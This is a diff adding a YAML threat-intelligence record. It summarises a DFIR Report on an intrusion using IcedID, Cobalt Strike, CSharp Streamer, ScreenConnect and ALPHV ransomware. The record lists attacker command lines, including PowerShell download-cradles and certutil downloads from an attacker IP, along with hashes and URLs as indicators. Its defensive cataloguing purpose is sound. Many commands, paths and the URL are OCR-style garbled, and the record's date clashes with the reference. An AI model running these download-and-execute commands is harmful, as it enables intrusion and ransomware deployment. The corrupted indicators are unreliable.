@@ -1,0 +1,88 @@
+description: A cyber threat report detailing activity attributed to a group utilizing
+  Cobalt Strike, CSharp Streamer, IcedID, and ALPHV ransomware.
+date: '2024-05-10'
+authors:
+- The DFIR Report
+attribution:
+- Cobalt Strike
+- CSharp Streamer
+- IcedID
+- ALPHV Ransomware
+malware_families:
+- Cobalt Strike
+- CSharp Streamer
+- IcedID
+- ALPHV Ransomware
+TTPs:
+  processs:
+  - cslite.exe
+  - wmiexec.py
+  - firefox.exe
+  - rclone.exe
+  - nocmd.vbs
+  - rcl.bat
+  - xcopy
+  - WMIPrvSE.exe
+  - ScreenConnect
+  - certutil.exe
+  - bitsadmin.exe
+  - powershell.exe
+  - rundll32.exe
+  - regsvr32.exe
+  - nsiexec.exe
+  commandline:
+  - '"C:\\programdata\\rcl.bat"'
+  - http[:]//85.209.11[.]48:80/download/test1.exe
+  - http[:]//85.209.11[.]48:80/download/http64.exe
+  - http[:]//85.209.11[.]48:80/download/csss.exe
+  - http[:]//85.209.11[.]48:80/ksajSk
+  - http[:]//85.209.11[.]48:80/ksaid
+  - http[:]//temp[.]sh/VSlAV/http64.exe
+  - WshShell.Run chr(34) & \"c:\\programdata\\rcl.bat\" & Chr(34), 0
+  - 'cmd.exe /C rundll32.exe C:\\Users\\ \\AppData\\Roaming\\ \\{485028A4-303D-8C90-8C72-2D965AA9FDIB}
+    1wiqocacod . d11, #1'
+  - nsiexec.exe /iL% %LOCALAPPDATA%\\TEMP\\setup.msi
+  - certutil urlcache -split - http://85.209.11.48:80/download test1 exe
+  - powershell.exe -nop -w hidden -c IEX (inew-object net webclient).downloadstring
+    http://85.209.11.48:80/ksajSk )
+  - regsvr32.exe htps64 i Start
+  - powershell.exe -nop -w hidden -c IEX (inew-object net webclient).downloadstring(
+    http://85.209.11.48:80/ksajSK)
+  powershell:
+  - IEX (new-object net webclient).downloadstring( hitp:/85.209,11.48:80/ksajsk )
+  - IEX (inew-object net webclient).downloadstring( http://85.209.11.48:80/ksajSK)
+  registry_keys: []
+  network_connections:
+  - port: 135
+  - port: 139
+  - port: 80
+  - port: 443
+  - port: 3389
+  file_modifications:
+  - C:\\programdata\\rcl.bat
+  - C:\\Users\\ \\AppData\\Local\\Temp\\Tenp1_JNOV@135_7747811. z1p\\Document[2623.16.11_08-67]
+    .vbs
+  - C:\\Windows\\TEMP\\ScreenConnect\\23.7.8.8676\\8677 ce3f-379a 4cce-988c-a23789113502run.ama
+  - C:\\Windows\\TEMP\\ScreenConnect\\23.7.8.8676\\275dd 615-71a4-4146-947-2567004289erun.cmd
+  - C:\\programdata\\cscs.exe
+  - C:\\programdata\\cs cscss.exe
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: 99d8c3e7806d71a2b6b28be525c8e10e
+- hash: 59791ec1c857d714f9b4ad6c15a78191
+- hash: 5d1817065266822df9fa6e8c5589534e
+- hash: 08fcf90499526a0a41797f8fdd67d107
+- hash: 7d130ace197f4148932306facfc8d71f
+- hash: c2ddb954877dcfbb62fd615a102ce5fa
+- hash: 69f4525abc1884e8fe65b0c2b120cfd4
+- ip: 109.236.80.191
+- url: http://85.209.11[.]48:80/download/test1.exe
+- url: http://85.209.11[.]48:80/download/http64.exe
+- url: http://85.209.11[.]48:80/download/csss.exe
+- url: http://85.209.11[.]48:80/ksajSk
+- url: http://85.209.11[.]48:80/ksaid
+- url: http://temp[.]sh/VSlAV/http64.exe
+reference: https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/
+file_creation_date: May 12, 2025
